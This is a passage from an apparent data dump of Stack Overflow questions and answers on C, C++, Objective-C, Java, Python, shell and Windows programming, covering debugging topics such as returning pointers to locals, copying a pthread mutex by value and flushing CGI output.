        if(t1 &gt;= 0 &amp;&amp; t2 &gt;= 0)
            return true;
        else
            return false;  // they would intersect if they are lines, but they are not lines
    }
}
</code></pre>
"
"<p>say I have the following code:</p>

<pre><code>char[5][5] array;

for(int i =0; i &lt; 5; ++i)
{
   for(int j = 0; j &lt; 5; ++i)
   { 
       array[i][j] = //random char;
   }
}
</code></pre>

<p>Would there be a benefit for initializing each row in this array in a separate thread?</p>

<p>Imagine instead of a 5 by 5 array, we have a 10 by 10? 
n x n? </p>

<p>Also, this is done once, during application startup.</p>
","9530","","<p>Unless you're doing a significant amount of computation, <strong>no</strong>, there will not be any benefit.  It's possible you might even see <em>worse</em> performance due to caching effects.</p>

<p>This type of initialization is memory-bound, not CPU bound.  The time it takes to initialize the array depends on the speed of your memory; your CPU will just waste cycles spinning waiting for the memory operations to commit.  Adding more threads will still have them all waiting for memory, and if they're all fighting over the same cache lines, the performance will be worse because now the caches of the separate CPUs have to synchronize with each other to avoid cache incoherency.</p>
"
"<p>I wonder about the use of the <code>static</code> keyword as scope limiting for variables in a file, in C.</p>

<p>The standard way to build a C program as I see it is to:</p>

<ul>
<li>have a bunch of c files defining functions and variables, possibly scope limited with <code>static</code>.</li>
<li>have a bunch of h files declaring the functions and possibly variables of the corresponding c file, for other c files to use. Private functions and variables are not published in the h file.</li>
<li>every c file is compiled separately to an o file.</li>
<li>all o files are linked together to an application file.</li>
</ul>

<p>I see two reasons for declaring a gobal as <code>static</code>, if the variable is not published in the h file anyway:</p>

<ul>
<li>one is for readability. Inform future readers including myself that a variable is not accessed in any other file.</li>
<li>the second is to prevent another c file from redeclaring the variable as <code>extern</code>. I suppose that the linker would dislike a variable being both <code>extern</code> and <code>static</code>. (I dislike the idea of a file redeclaring a variable owned by someone else as <code>extern</code>, is it ok practice?)</li>
</ul>

<p>Any other reason? </p>

<p>Same goes for <code>static</code> functions. If the prototype is not published in the h file, other files may not use the function anyway, so why define it <code>static</code> at all?
I can see the same two reasons, but no more.</p>
","9530","","<p>If a global variable is declared static, the compiler can sometimes make better optimizations than if it were not.  Because the compiler knows that the variable cannot be accessed from other source files, it can make better deductions about what your code is doing (such as ""this function does not modify this variable""), which can sometimes cause it to generate faster code.  Very few compilers/linkers can make these sorts of optimizations across different translation units.</p>
"
"<p>Trying to make a simple rectangle/bin packer in C. Takes a given area and finds placement for any given size rectangle.</p>

<p>About after 4 recursions is when I get the segmentation fault.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

typedef struct node_type PackNode;
struct node_type {
 int x , y;
 int width , height;
 int used;
 struct node_type *left;
 struct node_type *right;
};

typedef struct point_type PackPoint;
struct point_type {
 int x,y;
};


PackNode _clone(PackNode *node) {
 PackNode clone;
 clone.used = 0;
 clone.x = node-&gt;x;
 clone.y = node-&gt;y;
 clone.width = node-&gt;width;
 clone.height= node-&gt;height;
 clone.left = NULL;
 clone.right= NULL;
 return clone;
}
PackNode root;
int rcount;

PackPoint* recursiveFind(PackNode *node, int w, int h) {
 PackPoint rp;
 PackPoint *p = NULL;
 rcount++;
 printf (""rcount = %u\n"", rcount);


 //left is not null go to left, if left didn't work try right.
 if (node-&gt;left!=NULL) {
  //move down to left branch

  p = recursiveFind(node-&gt;left, w, h);
  if (p!=NULL) {
   return p;
  } else {
   p =  recursiveFind(node-&gt;right, w, h);
   return p;
  }

 } else {
  //If used just return null and possible go to the right branch;
  if (node-&gt;used==1 || w &gt; node-&gt;width || h &gt; node-&gt;height) {

   return p;
  }

  //if current node is exact size and hasn't been used it return the x,y of the mid-point of the rectangle
  if (w==node-&gt;width &amp;&amp; h == node-&gt;height) {

   node-&gt;used=1;


   rp.x = node-&gt;x+(w/2);
   rp.y = node-&gt;y+(h/2);

   p = &amp;rp;
   return p;
  }


  //If rectangle wasn't exact fit, create branches from cloning it's parent.

  PackNode l_clone = _clone(node);
  PackNode r_clone = _clone(node);
  node-&gt;left = &amp;l_clone;
  node-&gt;right = &amp;r_clone;

  //adjust branches accordingly, split up the current unused areas
  if ( (node-&gt;width - w) &gt; (node-&gt;height - h) )
  {
   node-&gt;left-&gt;width = w;
   node-&gt;right-&gt;x = node-&gt;x + w;
   node-&gt;right-&gt;width = node-&gt;width - w;

  } else {
   node-&gt;left-&gt;height = h;
   node-&gt;right-&gt;y = node-&gt;y + h;
   node-&gt;right-&gt;height = node-&gt;height - h;
  }

  p = recursiveFind(node-&gt;left, w, h);
  return p;
 }
 return p;
}





int main(void) {
 root = malloc(
 root.x=0;
 root.y=0;
 root.used=0;
 root.width=1000;
 root.height=1000;
 root.left=NULL;
 root.right=NULL;


 int i;
 PackPoint *pnt;
 int rw;
 int rh;
 for (i=0;i&lt;10;i++) {
  rw = random()%20+1;
  rh = random()%20+1;
  pnt = recursiveFind(&amp;root, rw, rh);
  printf(""pnt.x,y: %d,%d\n"",pnt-&gt;x,pnt-&gt;y);
 }



 return 0;

}
</code></pre>
","9530","","<p>You're returning a pointer to a local variable in this case:</p>

<pre><code>  //if current node is exact size and hasn't been used it return the x,y of the mid-point of the rectangle
  if (w==node-&gt;width &amp;&amp; h == node-&gt;height) {

   node-&gt;used=1;


   rp.x = node-&gt;x+(w/2);
   rp.y = node-&gt;y+(h/2);

   p = &amp;rp;
   return p;
  }
</code></pre>

<p>That's a <strong>big no-no</strong>.  The local variable is no longer valid after the function returns, so the pointer you're returning points to stack memory that's now potentially being used for something else.  When you start doing stuff with that, you're corrupting your stack, and your program will start behaving very erratically.</p>

<p>To fix this, you'll need to do one of a few things: (1) have <code>recursiveFind()</code> return a <code>PackNode</code> by value, instead of a pointer to a <code>PackNode</code>; (2) use a global/static <code>PackNode</code> instance, and return a pointer to that (note that this then makes <code>recursiveFind()</code> non-thread-safe); or (3) return a pointer to a dynamically allocated instance of a <code>PackNode</code> (e.g. allocated with <code>malloc()</code>); this then requires that the caller of <code>recursiveFind()</code> call <code>free()</code> on the returned pointer at some later point when it's no longer needed.</p>

<p>Likewise, this code is also wrong:</p>

<pre><code>  //If rectangle wasn't exact fit, create branches from cloning it's parent.

  PackNode l_clone = _clone(node);
  PackNode r_clone = _clone(node);
  node-&gt;left = &amp;l_clone;
  node-&gt;right = &amp;r_clone;
</code></pre>

<p>You need to allocate <code>l_clone</code> and <code>r_clone</code> on the heap, not on the stack, because again, as soon as this function returns, those <code>node</code> pointers will no longer be valid.  I'd recommend having <code>_clone()</code> return a pointer to a <code>PackNode</code> (allocated with <code>malloc()</code>) instead of a full <code>PackNode</code> object by value.  If you do that, though, the calling code needs to know to call <code>free()</code> on the returned pointer at some later point when the object is no longer needed.</p>

<p>[Also, identifiers at global scope beginning with an underscore are reserved by the implementation, so you should avoid using such names; you should rename <code>_clone()</code> to something like <code>clone()</code> or <code>clonePackNode()</code>].</p>
"
"<p>Using C++ and GCC, can I declare an extern variable that uses a specific address in memory?
Something like</p>

<pre><code>int key __attribute__((__at(0x9000)));
</code></pre>

<p>AFAIK this specific option only works on embedded systems. If there is such an option for use on the x86 platform, how can I use it?</p>
","9530","","<p>You could just use a macro:</p>

<pre><code>#define KEY (*(int*)0x9000)
</code></pre>

<p>so that any writes to <code>KEY</code> write to that memory location, and any reads to <code>KEY</code> read from that memory location.</p>

<p>If that memory location could change outside of your control (e.g. if it represents a hardware register or some sort of memory-mapped I/O), then you should declare it <code>volatile</code>:</p>

<pre><code>#define KEY (*(volatile int *)0x9000)
</code></pre>

<p>This will force the compiler to re-read the value from memory each time you read it and rewrite it back to memory every time you write it, instead of possibly caching it in a register.</p>
"
"<p>I've got a tcsh shell script that I would like to stop with an error on nonzero status most of the time, but in some cases I want to ignore it. For example:</p>

<pre><code>#!/bin/tcsh -vxef

cp file/that/might/not/exist . #Want to ignore this status
cp file/that/might/not/exist . ; echo ""this doesn't work""
cp file/that/must/exist . #Want to stop if this status is nonzero
</code></pre>
","9530","","<p>I don't know about tcsh, but with bash, you can use <a href=""http://www.gnu.org/software/bash/manual/bashref.html#The-Set-Builtin"" rel=""nofollow""><code>set -e</code></a> to do this.  When the <code>-e</code> flag is set, bash will exit immediately if any subcommand fails (see the manual for technical details).  When not set, it will continue to execute.  So, you can do something like this:</p>

<pre><code>set +e
cp file/that/might/not/exist .  # Script will keep going, despite error
set -e
cp file/that/might/not/exist .  # Script will exit here
echo ""This line is not reached""
</code></pre>
"
"<p>how could I do the same as GluPerspective without Glu? Thanks</p>

<p>ex: gluPerspective(45.0, (float)w / (float)h, 1.0, 200.0);</p>
","9530","","<p>It's explained fairly clearly in the <a href=""http://www.opengl.org/sdk/docs/man/xhtml/gluPerspective.xml"" rel=""nofollow""><code>gluPerspective</code></a> documentation.  You just build up the appropriate 4x4 transformation matrix and use <code>glMultMatrix</code> to multiply it into the current transform:</p>

<pre><code>void myGluPerspective(double fovy, double aspect, double zNear, double zFar)
{
    double f = 1.0 / tan(fovy * M_PI / 360);  // convert degrees to radians and divide by 2
    double xform[16] =
    {
        f / aspect, 0, 0, 0,
        0,          f, 0, 0,
        0,          0, (zFar + zNear)/(zFar - zNear), -1,
        0,          0, 2*zFar*zNear/(zFar - zNear), 0
    };
    glMultMatrixd(xform);
}
</code></pre>

<p>Note that OpenGL stores matrices in <em>column-major</em> order, so the order of array elements above is transposed from what's written in the <code>gluPerspective</code> documentation.</p>
"
"<p>I get a abort() which I am not able to 'catch' in my code.
Perhaps I am missing some understanding; can you give me some insight or perhaps help me with the abort() ?</p>

<p>Please note; the code works fine for thousands of users I have; but a very few (two now) have reported this crash.</p>

<p>First the code (simplified):</p>

<pre><code>244: -(void)openBSDSocket:(NSString*)hostname useSSL:(bool)useSSL {
245:     // Look up host 
246:     if ( (remoteHost = gethostbyname([hostName cStringUsingEncoding:NSUTF8StringEncoding])) == NULL ) {
247:        [NSException raise:SOCKET_EX_HOST_NOT_FOUND format:SOCKET_EX_HOST_NOT_FOUND_F, strerror(errno)];
248: }
</code></pre>

<p>Caused this crash (dump)</p>

<pre><code>Thread 34 Crashed:
0   libSystem.B.dylib               0x00007fff8550fb6e __semwait_signal_nocancel + 10
1   libSystem.B.dylib               0x00007fff8550fa70 nanosleep$NOCANCEL + 129
2   libSystem.B.dylib               0x00007fff8556c3c6 usleep$NOCANCEL + 57
3   libSystem.B.dylib               0x00007fff8558b97c abort + 93
4   libSystem.B.dylib               0x00007fff854a3615 free + 128
5   libSystem.B.dylib               0x00007fff854f409b _mdns_search + 1469
6   libSystem.B.dylib               0x00007fff854f8564 _mdns_hostbyname + 287
7   libSystem.B.dylib               0x00007fff854f826d search_host_byname + 139
8   libSystem.B.dylib               0x00007fff854f8186 gethostbyname + 98
9   com.NZBVortex.NZBVortex         0x0000000100021346 -[CFNetworkStream openBSDSocket::] + 246
</code></pre>

<p>All the openBSDSocket's are correctly wrapped with exception catched, which of course doesn't catch the abort()</p>

<p>Can you help me give some insight here?</p>
","9530","","<p>Your heap is getting corrupted.  <code>gethostbyname()</code> is calling <code>free()</code> to free some memory it allocated.  <code>free()</code> has some internal consistency checks in it: if it detects that the heap has been corrupted, then it calls <code>abort()</code> to terminate the program -- once your heap is corrupted you pretty much can't recover from it, so the best thing to do is to fail as soon as you've detected that.</p>

<p>Unfortunately, figuring out exactly where your heap is getting corrupted is not easy.  There are some <a href=""http://developer.apple.com/mac/library/releasenotes/DeveloperTools/RN-MallocOptions/index.html"" rel=""nofollow"">Malloc Debug Environment Variables</a> you can set to help track this down.</p>
"
"<p>I am working on a C++ assignment for class that wants me to overload the "">>"" operator. I am encountering errors linking in both Visual Studio 2005 and Xcode 3.2.2. The C++ code is separated into a few files. The prototypes are stored in overload.h, the implementations are stored in overload.cpp, and <code>main()</code> is in overloadtester.cpp (although I have not been able to put anything related to this new overloaded operator in main yet because of the error. below is the code I added before I started getting the errors (listed below)  </p>

<pre><code>// overload.h  
// Class Name OverloadClass
#ifndef _OverloadClass_H
#define _OverloadClass_H
#include &lt; string &gt;  
using namespace std ;
class OverloadClass
{
public:
    // Constructors and methods
private:
    x_;
    y_;
};
istream&amp; operator&gt;&gt; (istream&amp; in, OverloadClass &amp;p);
#endif



// overload.cpp
#include &lt; iostream &gt;
#include &lt; string &gt;
#include &lt; sstream &gt;
#include &lt; istream &gt;  
extern ""C""
{
#include ""DUPoint.h""
}  
using namespace std ;  

void OverloadClass::input()
{
    char leftParen;
    char comma ;
    cin &gt;&gt; leftParen &gt;&gt; x_ &gt;&gt; comma;

    char rightParen;
    cin &gt;&gt; y_ &gt;&gt; rightParen;
}



// Constructor and method implementations  
istream&amp; operator&gt;&gt; (istream&amp; in, OverloadClass &amp;p)
{ 
    p.input();
    return in;
}
</code></pre>

<p>The error I have been getting in Xcode is:  </p>

<pre>
Link ./OverloadDirectory   
Undefined symbols: ""operator>>(std:basic_istream >&, OverloadClass&)"" referenced from: _main in overloadtester.o 
ld: symbol(s) not found collect2: ld returned 1 exit status
</pre> 

<p>I dont have access to the computer with VS at this very moment hopefully when I do I can post the error I am getting from running the code on that IDE.</p>

<p>Edited in response to @Mark's request for more details<br>
Edited in response to @sbi's request for more info on input()</p>
","9530","","<p>You're not properly linking in overload.cpp.  Make sure that overload.cpp is party of your project file in both cases.</p>
"
"<p>I am saving a date that has been converted to a string to a plist when the app exits. When the viewDidLoad is run I am trying to read the string back in and convert it back to a date. The string saves to the plist and reads in correctly but will not convert back to a date. I am using the standard format given by the NSDate date command. Time1 is always null. </p>

<p>The output looks like this:</p>

<pre><code>time1string = 2010-07-07 13:47:12 -0500
time1 = (null)
</code></pre>

<p>The code looks like this:</p>

<pre><code>- (void)applicationWillTerminate:(NSNotification *)notification {
NSMutableArray *array = [[NSMutableArray alloc] init];

[array addObject: [NSString stringWithFormat:@""%@"", time1]];

[array writeToFile:[self dataFilePath] atomically:YES];
[array release];

NSLog(@""APP Terminating, Persisting Data"");
</code></pre>

<p>}</p>

<p>-(void)viewDidLoad {</p>

<pre><code>NSLog(@""View did load"");
NSString *filePath = [self dataFilePath];
if ([[NSFileManager defaultManager] fileExistsAtPath:filePath]) {
    NSArray *array = [[NSArray alloc] initWithContentsOfFile:filePath];

    NSString *time1string = [array objectAtIndex:1];
    NSLog(@""time1string = %@"",time1string);
    NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
    [dateFormat setDateFormat:@""yyyy-MM-dd hh:mm:ss Z""];
    time1 = [dateFormat dateFromString:time1string];
    NSLog(@""time1 = %@"",time1);
    [dateFormat release];
    [array release];

}
UIApplication *app = [UIApplication sharedApplication];
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(applicationWillTerminate:)
                                             name:UIApplicationWillTerminateNotification 
                                           object:app];
 [super viewDidLoad];
</code></pre>

<p>}</p>
","9530","","<p>It looks like it's failing to parse because you're using the wrong date format.  Try using <code>@""yyyy-MM-dd HH:mm:ss Z""</code> instead.  The <code>hh</code> format requires an hour in the range 1-12, whereas <code>HH</code> uses 0-23.</p>

<p>See the <a href=""http://unicode.org/reports/tr35/tr35-6.html#Date_Format_Patterns""><code>Locale Data Markup Language</code></a> for the full reference on all of the patterns that can be used here (via <a href=""http://developer.apple.com/mac/library/documentation/Cocoa/Conceptual/DataFormatting/Articles/dfDateFormatting10_4.html#//apple_ref/doc/uid/TP40002369-SW1"">Data Formatters reference</a>).</p>
"
"<p>Hello I am new to CGI programming in C.  </p>

<p>What I'm looking to do is, per the title, print things dynamically.  For instance, consider this code that prints out a bunch of numbers:</p>

<pre><code>int main()
{
    long int l=0;

    printf(""Content-Type: text/plain;charset=us-ascii\n\n"");

    while(1)
    {    
        printf(""%li "", l);

        if ((l%30) == 0)
            printf(""\n"");

        if (l == 5000)
            exit(1);

        ++l;
        usleep(3000);
    }    
}
</code></pre>

<p>The issue with it is that it doesn't print until the whole thing finishes.  How do I go about getting things to print exactly as they would on a terminal?</p>
","9530","","<p>You need to explicitly flush your output stream.  When your program's output is being redirected (such as to a file or to the input of another program like in this case), then it only gets flushed periodically when the output buffer (usually 4–64 KB or so) fills up.</p>

<p>To flush stdout, just call <a href=""http://linux.die.net/man/3/fflush"" rel=""nofollow""><code>fflush(3)</code></a>:</p>

<pre><code>if((l%30) == 0) {
    printf(""\n"");
    fflush(stdout);
}
</code></pre>

<p>Note that when the output is going to a terminal (e.g. if you just ran your program normally), then by default it is <em>line-buffered</em>: every time you print a newline, the output gets flushed.  This makes interactive programs much easier to write, but degrades the performance of non-interactive programs.  The more often you flush, the slower your program goes, so you should only flush when necessary, such as after writing one long coherent set of data but before performing a long intensive task.</p>
"
"<p>This is the first time that this error has come up. I am using Cygwin with Eclipse 3.5 and my Path variable is set to: <code>%CommonProgramFiles%\Microsoft Shared\Windows Live;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;C:\Program Files\Microsoft SQL Server\100\Tools\Binn\;C:\Program Files\Microsoft SQL Server\100\DTS\Binn\;C:\Program Files\Apache Ant\bin;C:\Program Files\SVN\bin;C:\Program Files\Java\jdk1.6.0_18\bin;C:\Users\Mohit\Developer\AndroidSDK\tools;C:\Program Files\QuickTime\QTSystem\;C:\cygwin\bin</code> Notice that <code>C:\cygwin\bin</code> is in my Path. And make.exe is is my Cygwin bin. So I think the problem is not with my system, but maybe my project. But I can't find anything wrong with it. Any suggestions?</p>
","9530","","<p>Use <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx"" rel=""nofollow"">Process Explorer</a> to take a look at the PATH environment variable inside Eclipse's process.  It's possible that it's changing its PATH internally -- if that's the case, you'll need to figure out how to configure Eclipse so that its PATH is set up correctly.</p>

<p>If you're finding that <code>C:\cygwin\bin</code> isn't in Eclipse's PATH, and you recently added that to your PATH, you need to close and restart Eclipse for that change to take affect.</p>

<p>If you still can't figure it out, try using <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx"" rel=""nofollow"">Process Monitor</a> with a filter for Eclipse.exe to get a long, detailed listing of everything it's trying to do.  Look for the call to <code>CreateProcess()</code> that's failing and see if you can learn anything more.</p>
"
"<p>A while back I released an application in Java. While I targetted it for Java 6, I realized that there was a significant Macintosh user base. At the time, Apple had not gotten around to creating a JRE 6 for their users, so I had to make the application compatible with both Java 5 and 6. </p>

<p>Now I've returned to that project and realize that I can't support those users any more; Sun won't let me download the JDK 5 anymore because it's end of life. So I'm caught at a crossroads; as far as I can tell, PPC Mac users still don't have a JRE 6 to use.</p>

<p>So I ask this question: How do I resolve this predicament? I still want to support those users, but I simply don't have a JDK with which to build. Has Apple released a JRE 6 for their PPC users? Is there an alternate way to get JDK 5 (other than becoming a business member of Sun)? Is there some alternative recommendation to supporting these users?</p>

<p>Regards,
-- Shirik</p>

<p>EDIT: Some additional info, if Apple <em>has</em> released Java 6 for PPC, how easy is it to get? I ask this because I'm still constantly seeing logs from my users which indicate PPC architecture with a Java 5 VM.</p>
","9530","","<p>As far as I know, Apple has only released Java 6 for x86-64, and I'd be willing to bet my hat that they will never release Java 6 for either PPC or for plain old 32-bit x86 (note that every Mac released after about mid-2007 or so is x86-64).</p>
"
"<p>I wont to rotate QuickTime Move 180 degrees.</p>

<p>Now my file's matrix(tkhd) is</p>

<p>1 0 0</p>

<p>0 1 0</p>

<p>0 0 1</p>

<p>I got this matrix form <a href=""http://developer.apple.com/quicktime/download/"" rel=""nofollow"">Dumpster</a>.</p>

<p>What is the 3 × 3 matrix for a rotation of 180 degrees?</p>
","9530","","<p>Assuming you want a 3x3 homogeneous matrix for a 2D rotation about the Z-axis, then the matrix you want is:</p>

<pre>
-1  0  0
 0 -1  0
 0  0  1
</pre>

<p>If you want to rotate about a different axis, then the matrix will be different.</p>
"
"<p>I'm writing a Windows CE application in C++ directly applying the WINAPI. In this application I parse a text file, which may or may not be large and thus may or may not take a while to load; and as I will add functionality to load files across the wireless network, I figured it would be best to add a progress bar.</p>

<p>My aim is to display the progress bar in a modal dialog, thereby preventing the user from interacting with the main window. A thread is then created to perform the loading in the background, leaving the main thread to update the GUI.</p>

<p>However, using <code>EndDialog()</code> prevents me to return to the code which loads the file until the dialog has been closed. Obviously I want to show the dialog and <em>then</em> load the load, periodically updating the progress from the background thread. At this point I only know of two options to circumvent this:</p>

<ol>
<li>Create the dialog using <code>CreateDialog</code>, modify the message handler to accommodate messages designated to the dialog, disable the main window and lastly create the background thread.
</li>
<li>
Create the background thread in a suspended initial state, create the dialog using <code>DialogBoxParam</code> passing along the thread ID, and when capturing the <code>WM_INITDIALOG</code> resume the thread.
</li>
</ol>

<p>Although any of these two would probably work (I'm leaning towards the second option), I'm curious about whether this is the way progress bars are supposed to be handled in a Windows environment -- or if there is a leaner, more clever way of doing it.</p>
","9530","","<p>You don't have to do anything particularly tricky or unusual.  Just create the modal dialog box with <a href=""http://msdn.microsoft.com/en-us/library/ms645452%28VS.85%29.aspx"" rel=""nofollow""><code>DialogBox()</code></a>.  In the <code>WM_INITDIALOG</code> handler of your dialog box procedure, create the background thread to load the file.  As the loading progresses, send the <a href=""http://msdn.microsoft.com/en-us/library/bb760844%28v=VS.85%29.aspx"" rel=""nofollow""><code>PBM_SETPOS</code></a> message to the progress bar control to update it.</p>

<p>When the loading completes, call <code>EndDialog()</code> to close the dialog box.  However, <code>EndDialog()</code> must be called from within your dialog procedure.  So to do that, you need to send a dummy message (e.g. <code>WM_APP</code>):</p>

<pre><code>DialogBox(..., DlgProc);
// File loading is done and dialog box is gone now
...
INT_PTR CALLBACK DlgProc(HWND hwnd, UINT msg, LPARAM lparam, WPARAM wparam)
{
    switch(msg)
    {
    case WM_INITDIALOG:
        CreateThread(..., LoadingThread, ...);
        return TRUE;

    case WM_APP:
        EndDialog(hwnd);
        return TRUE;
    ...
    }

    return FALSE:
}

DWORD WINAPI LoadingThread(LPVOID param)
{
    // Load the file
    while(!done)
    {
        ...
        SendMessage(hwndProgressBar, PBM_SETPOS, progress, 0);
    }

    SendMessage(hwndDialogBox, WM_APP, 0, 0);
    return 0;
}
</code></pre>
"
"<p>I've been trying to build a DNS resolver in C# since last week, which is a painful process. </p>

<p>Though I've made some progress (say, I can parse the data of a DNS Message correctly), it became more and more likely to me that this may not be the right job for C#. </p>

<p>I have to be prepared in case I had to port to C++. But it is best not do it from scratch again.</p>

<p>So is there any project for Windows that can be used to parse a received DNS message or construct one to send? </p>

<p>Thanks.</p>
","9530","","<p><a href=""http://www.isc.org/software/bind"" rel=""nofollow""><code>bind</code></a> has a whole suite of tools (with source code) for doing DNS queries and much, much more.  It's liberally licensed (MIT-like license), so you can use it even in commercial projects.</p>
"
"<p>In the <code>NSObject</code> protocol, it defines a method that is similar to this:</p>

<pre><code>-(Class) class
</code></pre>

<p>What type of object is the Class object? Or is it even an object? What can I do with the object? Can I get the base class or adopted protocols?</p>
","9530","","<p><code>Class</code> is itself a class defined by the <a href=""http://developer.apple.com/mac/library/documentation/Cocoa/Reference/ObjCRuntimeRef/Reference/reference.html"">Objective-C runtime</a>, akin to the <code>Class</code> class in Java.  For example, you can use the function <a href=""http://developer.apple.com/mac/library/documentation/Cocoa/Reference/ObjCRuntimeRef/Reference/reference.html#//apple_ref/c/func/class_getName""><code>class_getClassName()</code></a> to get the name of a class:</p>

<pre><code>NSObject *o = [[[NSObject alloc] init] autorelease];
NSLog(@""%s\n"", class_getClassName([o class]));  // prints ""NSObject""
</code></pre>

<p>You can do all kinds of introspection/reflection with <code>Class</code> objects; see the Objective-C runtime reference for details.</p>
"
"<p>I've written my own version of thread safe queue. However, when I run this program, it hangs/deadlocks itself.</p>

<p>Wondering, why is this locks/hangs forever.</p>

<pre><code>void concurrentqueue::addtoQueue(const int number)
{
    locker currentlock(lock_for_queue);
    numberlist.push(number);
    pthread_cond_signal(&amp;queue_availability_condition);
}

int concurrentqueue::getFromQueue()
{
    int number = 0;


    locker currentlock(lock_for_queue);
    if ( empty() )
    {
        pthread_cond_wait(&amp;queue_availability_condition,&amp;lock_for_queue);
    }

    number = numberlist.front();
    numberlist.pop();
    return number;
}

bool concurrentqueue::empty()
{       
    return numberlist.empty();
}
</code></pre>

<p>I've written, the class locker as RAII.</p>

<pre><code>class locker
{
public:
    locker(pthread_mutex_t&amp; lockee): target(lockee)
    {
        pthread_mutex_lock(&amp;target);
    }
    ~locker()
    {
        pthread_mutex_unlock(&amp;target);
    }
private:
        pthread_mutex_t target;
};
</code></pre>

<p>My writer/reader thread code is very simple. Writer thread, adds to the queue and reader thread, reads from the queue.</p>

<pre><code>void * writeintoqueue(void* myqueue)
{
    void *t = 0;
    concurrentqueue *localqueue = (concurrentqueue *) myqueue;

    for ( int i = 0; i &lt; 10 ; ++i)
    {
        localqueue-&gt;addtoQueue(i*10);
    }

    pthread_exit(t);
}

void * readfromqueue(void* myqueue)
{
    void *t = 0;
    concurrentqueue *localqueue = (concurrentqueue *) myqueue;
    int number = 0;
    for ( int i = 0 ; i &lt; 10 ; ++i)
    {
        number = localqueue-&gt;getFromQueue();
        std::cout &lt;&lt; ""The number from the queue is "" &lt;&lt; number &lt;&lt; std::endl;
    }
    pthread_exit(t);
}
</code></pre>
","9530","","<p>Reformulating spong's comment as an answer: your <code>locker</code> class should NOT be copying the <code>pthread_mutex_t</code> by value.  You should use a reference or a pointer instead, e.g.:</p>

<pre><code>class locker
{
public:
    locker(pthread_mutex_t&amp; lockee): target(lockee)
    {
        pthread_mutex_lock(&amp;target);
    }
    ~locker()
    {
        pthread_mutex_unlock(&amp;target);
    }
private:
        pthread_mutex_t&amp; target;  // &lt;-- this is a reference
};
</code></pre>

<p>The reason for this is that all pthreads data types should be treated as opaque types -- you don't know what's in them and should not copy them.  The library does things like looking at a particular memory address to determine if a lock is held, so if there are two copies of a variable that indicates if the lock is held, odd things could happen, such as multiple threads appearing to succeed in locking the same mutex.</p>

<p>I tested your code, and it also deadlocked for me.  I then ran it through <a href=""http://valgrind.org/"" rel=""nofollow"">Valgrind</a>, and although it did not deadlock in that case (due to different timings, or maybe Valgrind only simulates one thread at a time), Valgrind reported numerous errors.  After fixing <code>locker</code> to use a reference instead, it ran without deadlocking and without generating any errors in Valgrind.</p>

<p>See also <a href=""http://stackoverflow.com/questions/981011/c-programming-debugging-with-pthreads"">Debugging with pthreads</a>.</p>
"
"<p>What is the best (most compact) way to hand this situation:
One or more arguments to a method call depends on some condition, while the rest of the arguments are identical?</p>

<p>For example-- you want to</p>

<pre><code>DeathRay mynewWpn = new DeathRay(particle.proton, chassisColor.BLACK, oem.ACME)
</code></pre>

<p>if</p>

<pre><code>enemy_composition == nature.ANTIMATTER
</code></pre>

<p>but </p>

<pre><code>DeathRay mynewWpn = new DeathRay(particle.anti-proton, chassisColor.BLACK, oem.ACME)
</code></pre>

<p>if </p>

<pre><code>enemy_composition == nature.MATTER
</code></pre>

<p>Obviously you can <code>if-else</code> but it looks unnecessarily long when there are a lot of arguments or more than one conditional argument.  I have also done this creating an argument with an <code>if-else</code> beforehand and then calling the method.  Again, that seems kind of clunky.  Is there some sort of inline syntax similar to an Excel if-statement?</p>
","9530","","<p>Yes, it's called the ternary operator <code>?:</code></p>

<pre><code>DeathRay mynewWpn = new DeathRay(
    enemy_composition == nature.ANTIMATTER ? particle.proton : particle.anti_proton,
    chassisColor.BLACK, oem.ACME);
</code></pre>

<p>The syntax is <code>condition ? value_if_true : value_if_false</code>, and it has the lowest operator precedence, although parentheses are often added to avoid confusion.</p>
"
"<pre><code>&gt;&gt;&gt; class S(object):
...     def __init__(self):
...             self.x = 1
...     def x(self):
...             return self.x
...
&gt;&gt;&gt; s = S()
&gt;&gt;&gt; s.x
1
&gt;&gt;&gt; s.x()
Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
TypeError: 'int' object is not callable
</code></pre>

<p>Why, in this example, is <code>s.x</code> a method, but also an integer? It seems to me that <code>self.x = 1</code> should replace the <code>def x(self):</code> declaration of the attribute <code>x</code> during instantiation. Why is it that I can get and call, resulting in an integer and a method, respectively, the same attribute? My guess is that the variable look-up pattern in new-style classes is duck typed, so as to return the most relevant result to the caller. I would love to hear the whole story.</p>
","9530","","<p>I'm not sure what you think is going on, but there's nothing that tricky happening.  When you assign <code>self.x = 1</code>, the method <code>x</code> is no longer accessible.  From that point forward, <code>s.x</code> is only an integer -- attempts to call it as a method result in an exception, as you saw.</p>
"
"<p>I have acquired a DLL that was created in Visual Basic from a third party vendor(<strong>Sensor DLL.dll</strong>).  This DLL contains functions for talking to a sensor, and I need to call these functions from a Visual C++ program I am writing.  The vendor will not provide a header file, and I do not know Visual Basic.  If I had a header file this would be a 15 minute project... instead I am still struggling with it a week later.  Please Help!</p>

<p>I am told one function (<strong>Get_Data</strong>) in the DLL is of the form:</p>

<pre><code>Public Function Get_Data(ByVal Handle As String) As String
</code></pre>

<p>I have tried several methods for calling this Get_Data function with no success:</p>

<p><strong>Method 1)</strong> the DllImport attribute </p>

<pre><code>#using &lt;mscorlib.dll&gt;
using namespace System::Runtime::InteropServices; 

namespace Sensor
{
</code></pre>

<p>[DllImport(""Sensor DLL.dll"", EntryPoint = ""Get_Data"", CharSet = System::Runtime::InteropServices::CharSet::Unicode)]
    BSTR Get_Data(BSTR Handle);
    }</p>

<pre><code>//then I call the function
Sensor::Get_Data(Handle);
</code></pre>

<p>This method seems to be the closest I have gotten to a sloution.  It compiles, but gives the following error when it runs:</p>

<p><b>An unhandled exception of type 'System.EntryPointNotFoundException' occurred </p>

<p>Additional information: Unable to find an entry point named 'Get_Data' in DLL 'Sensor DLL.dll'.</b></p>

<p>I have tried various datatype combinations/permutations besides BSTR including BSTR*, wchar_t, int, etc.  It is possible that I missed one, but each datatype returns the same error.</p>

<p><strong>Method 2)</strong> dllimport storage-class attribute</p>

<pre><code>__declspec(dllimport) BSTR Get_Data(BSTR Handle);

//then I call the function
